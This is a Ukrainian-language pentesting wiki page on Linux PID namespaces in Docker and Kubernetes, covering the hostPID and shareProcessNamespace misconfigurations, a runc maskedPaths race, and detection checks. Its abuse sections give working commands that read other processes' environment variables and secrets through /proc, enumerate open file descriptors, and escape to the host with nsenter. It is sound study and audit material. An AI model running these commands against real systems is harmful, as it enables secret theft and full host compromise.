# Простір імен PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен PID керує нумерацією процесів і визначає, які процеси видимі. Саме тому контейнер може мати власний PID 1, хоча він не є справжньою машиною. Усередині простору імен workload бачить те, що виглядає як локальне дерево процесів. За межами простору імен host і надалі бачить справжні PID host і повну картину процесів.<sup>[[3]](#references)</sup>

З погляду безпеки простір імен PID важливий, оскільки видимість процесів має значну цінність. Якщо workload може бачити процеси host, він може отримати можливість спостерігати назви сервісів, аргументи командного рядка, секрети, передані в аргументах процесів, дані, отримані з оточення через `/proc`, і потенційні цілі для входу в простір імен. Якщо він може не лише бачити ці процеси, наприклад надсилати сигнали або використовувати ptrace за відповідних умов, проблема стає значно серйознішою.

## Робота

Новий простір імен PID починає роботу зі своєю внутрішньою нумерацією процесів. Перший процес, створений усередині нього, стає PID 1 з погляду цього простору імен, а отже отримує спеціальну семантику, подібну до init, для осиротілих дочірніх процесів і обробки сигналів. Це пояснює багато особливостей контейнерів, пов’язаних із init-процесами, прибиранням zombie-процесів і тим, чому в контейнерах іноді використовують невеликі init-обгортки.<sup>[[3]](#references)</sup>

Простори імен PID утворюють ієрархію. Процес у просторі імен-предку може звертатися до нащадків, використовуючи PID, призначений у просторі імен-предку, але нащадок не може звертатися до завдань, що існують лише в просторі імен-предку, через звичайні PID-based syscalls або виконати `setns()` вгору, до простору імен PID-предка. procfs, що належить предку й навмисно відкритий для нащадка, усе одно може leak-нути представлення процесів предка. Крім того, приєднання до простору імен PID за допомогою `setns()` змінює простір імен для **майбутніх дочірніх процесів**, а не для самого викликувача; тому інструменти після приєднання виконують fork. Монтування procfs зберігає представлення PID процесу, який його змонтував, тому створення нового procfs після `unshare(CLONE_NEWPID)` має значення для безпеки, а не є лише косметичною зміною.<sup>[[3]](#references)</sup>

Важливий урок із погляду безпеки полягає в тому, що процес може здаватися ізольованим, оскільки бачить лише власне дерево PID, але цю ізоляцію можна навмисно прибрати. Docker надає цю можливість через `--pid=host`, а Kubernetes — через `hostPID: true`. Після приєднання контейнера до простору імен PID host workload безпосередньо бачить процеси host, і багато подальших attack paths стають набагато реалістичнішими.

## Лабораторна робота

Щоб вручну створити простір імен PID:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Тепер shell бачить приватне представлення процесів. Прапорець `--mount-proc` важливий, оскільки він монтує екземпляр procfs, що відповідає новому PID namespace, завдяки чому список процесів усередині є узгодженим.<sup>[[3]](#references)</sup>

Щоб порівняти поведінку контейнера:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Різниця очевидна й проста для розуміння, тому це хороша перша лабораторна робота для читачів.

## Runtime Usage

Звичайні контейнери в Docker, Podman, containerd і CRI-O отримують власний PID namespace. У Kubernetes контейнери зазвичай мають окремі представлення PID; `shareProcessNamespace: true` навмисно створює спільне для всього Pod представлення.<sup>[[4]](#references)</sup> Натомість `hostPID: true` вибирає PID namespace вузла. Середовища LXC/Incus використовують той самий примітив ядра, хоча сценарії використання system-container можуть відкривати складніші дерева процесів і заохочувати застосування додаткових способів налагодження.

Те саме правило діє всюди: якщо runtime вирішив не ізолювати PID namespace, це навмисне послаблення межі контейнера.

## Misconfigurations

Канонічна помилка конфігурації — спільне використання host PID. Команди часто виправдовують це зручністю налагодження, моніторингу або керування сервісами, але це завжди слід розглядати як суттєвий виняток із безпеки. Навіть якщо контейнер не має безпосередньої можливості запису в процеси хоста, самої видимості може бути достатньо, щоб розкрити багато інформації про систему. Після додавання таких capabilities, як `CAP_SYS_PTRACE`, або корисного доступу до procfs ризик значно зростає.

Ще одна помилка — припущення, що спільне використання host PID є нешкідливим лише тому, що workload за замовчуванням не може завершувати або виконувати ptrace над процесами хоста. Такий висновок ігнорує цінність enumeration, доступність цілей для входу в namespace і те, як видимість PID поєднується з іншими послабленими контролями.

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true` відрізняється від `hostPID`: він відкриває процеси **інших контейнерів у тому самому Pod**, а не процеси вузла. Після цього скомпрометований sidecar або debug container може перелічувати command lines і дані середовища sibling-контейнерів з урахуванням перевірок доступу procfs, надсилати сигнали, якщо це дозволяють credentials, і переміщатися файловою системою sibling-контейнера через `/proc/<pid>/root`. Kubernetes прямо попереджає, що secrets у command line/environment і файлові системи контейнерів у такому разі захищаються лише відповідними Unix permissions.<sup>[[4]](#references)</sup>

Корисна перевірка на стороні кластера:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Із скомпрометованого контейнера в Pod-wide PID namespace спочатку перевірте фактичний доступ, а не припускайте, що видимість означає можливість читання:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Зловживання

Якщо простір імен PID хоста спільно використовується, зловмисник може переглядати процеси хоста, збирати аргументи процесів, визначати цікаві служби, знаходити потенційні PID для `nsenter` або поєднувати видимість процесів із привілеями, пов’язаними з `ptrace`, щоб втручатися в робочі навантаження хоста чи сусідніх середовищ. У деяких випадках достатньо просто побачити потрібний довготривалий процес, щоб змінити подальший план атаки.

Перший практичний крок завжди полягає в тому, щоб підтвердити, що процеси хоста справді видимі:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Щойно PID хоста стають видимими, аргументи процесів і цілі входу до namespace часто стають найкориснішим джерелом інформації:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Якщо доступний `nsenter` і є достатні привілеї, перевірте, чи можна використати видимий процес хоста як міст до namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Навіть коли вхід заблоковано, спільне використання PID хоста вже є корисним, оскільки розкриває структуру сервісів, компоненти середовища виконання та потенційні привілейовані процеси, які можна атакувати далі. Сама видимість PID **не** надає дозволу надсилати сигнали, виконувати трасування, читати конфіденційні записи `/proc/<pid>` або приєднуватися до інших namespace цілі; усе ще мають значення облікові дані, dumpability, capabilities у user namespace, якому належить цільовий namespace, політики Yama/LSM і seccomp.<sup>[[3]](#references)</sup> Див. [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace), щоб ознайомитися з прикладами process injection.

Видимість PID хоста також робить зловживання file descriptor реалістичнішим. Якщо привілейований процес хоста або сусіднє workload має відкритий конфіденційний файл чи socket, attacker може отримати змогу перевірити `/proc/<pid>/fd/` і отримати доступ до базового об’єкта залежно від перевірок на кшталт ptrace, ownership, параметрів монтування procfs, типу об’єкта та моделі цільового сервісу. Сам факт видимості symlink FD не означає, що його можна відкрити, а socket неможливо дублювати лише відкриттям його symlink `/proc/<pid>/fd/N`. Опис окремого primitive `pidfd_getfd()` і перевірок авторизації див. у [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ці команди корисні, оскільки дають змогу визначити, чи зменшує `hidepid=1` або `hidepid=2` видимість між процесами та чи взагалі видимі очевидно цікаві дескриптори, як-от відкриті файли з секретами, логи або Unix-сокети.

### Повний приклад: host PID + `nsenter`

Спільний доступ до host PID стає прямим host escape, коли процес також має достатні привілеї для приєднання до host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Якщо команда виконується успішно, процес контейнера тепер працює в mount-, UTS-, network-, IPC- і PID-просторах імен хоста. Наслідком є негайна компрометація хоста.

Навіть якщо `nsenter` відсутній, такого самого результату можна досягти через бінарний файл хоста, якщо файлову систему хоста змонтовано:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Нещодавні примітки щодо runtime

Деякі атаки, пов’язані з PID namespace, не є традиційними misconfiguration `hostPID: true`, а являють собою помилки реалізації runtime у тому, як застосовуються захисти procfs під час налаштування container.

#### Race у `maskedPaths`, що веде до host procfs

У вразливих версіях `runc` attackers, здатні контролювати container image або workload `runc exec`, могли скористатися race під час етапу маскування, замінивши `/dev/null` всередині container на symlink до чутливого шляху procfs, наприклад `/proc/sys/kernel/core_pattern`. Якщо race вдавалася, bind mount для masked path міг бути застосований до неправильного target і відкрити host-global procfs knobs новому container.<sup>[[1]](#references)</sup>

Корисна команда для перевірки:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Це важливо, оскільки кінцевий вплив може бути таким самим, як і за прямого відкриття procfs: доступні для запису `core_pattern` або `sysrq-trigger`, після чого відбувається виконання коду на host або відмова в обслуговуванні. Окремі сторінки про [masked paths](../masked-paths.md) і [sensitive host mounts](../../sensitive-host-mounts.md) охоплюють загальну поверхню атак procfs, не дублюючи її тут.

#### Ін’єкція в namespace за допомогою `insject`

Інструменти для ін’єкції в namespace, такі як `insject`, показують, що взаємодія з PID-namespace не завжди потребує попереднього входу в цільовий namespace до створення процесу. Допоміжний процес може під’єднатися пізніше, використати `setns()` і виконати код, зберігаючи видимість цільового PID-простору:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Цей тип техніки має значення переважно для advanced debugging, offensive tooling і post-exploitation workflows, де контекст namespace потрібно приєднати після того, як runtime уже ініціалізував workload.

### Пов’язані патерни зловживання FD

Варто окремо чітко зазначити два патерни, коли host PIDs видимі. По-перше, privileged process може залишати sensitive file descriptor відкритим після `execve()`, якщо для нього не було встановлено `O_CLOEXEC`. По-друге, services можуть передавати file descriptors через Unix sockets за допомогою `SCM_RIGHTS`. В обох випадках цікавим об’єктом є вже не pathname, а вже відкритий handle, який process із нижчими privileges може успадкувати або отримати.

Це важливо під час роботи з containers, оскільки handle може вказувати на `docker.sock`, privileged log, host secret file або інший high-value object, навіть якщо сам path недоступний безпосередньо з filesystem контейнера.

## Перевірки

Мета цих команд — визначити, чи має process приватне представлення PID, чи вже може перелічувати значно ширше process landscape.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Що тут цікаво:<sup>[[3]](#references)</sup>

- Якщо список процесів містить очевидні host-сервіси, спільне використання host PID, імовірно, вже активоване.
- Бачити лише невелике дерево, локальне для контейнера, — це нормальна базова ситуація; наявність `systemd`, `dockerd` або не пов’язаних із контейнером демонів — ні.
- `NSpid` може показати зіставлення PID у вкладених namespace. Крайніше ліве значення відповідає PID namespace, пов’язаному з монтуванням procfs, за ним ідуть значення для послідовно вкладених namespace.
- Сам по собі `readlink /proc/self/ns/pid` не може довести наявність `hostPID`: ізольований контейнер також має дійсний inode PID namespace. Порівнюйте його зі списком процесів, монтуванням procfs, конфігурацією runtime і inode namespace на стороні host, якщо він доступний.
- Коли стають видимими host PID, навіть доступна лише для читання інформація про процеси стає корисною розвідкою.

Якщо ви виявили контейнер, запущений зі спільним використанням host PID, не сприймайте це як косметичну відмінність. Це суттєво змінює те, що workload може бачити та потенційно на що може впливати.



## References

- [1] [рекомендації з безпеки runc: escape з контейнера через зловживання «masked path» унаслідок race conditions під час монтування (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Реліз інструмента — insject: інжектор Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Книга Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Спільне використання Process Namespace між контейнерами в Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
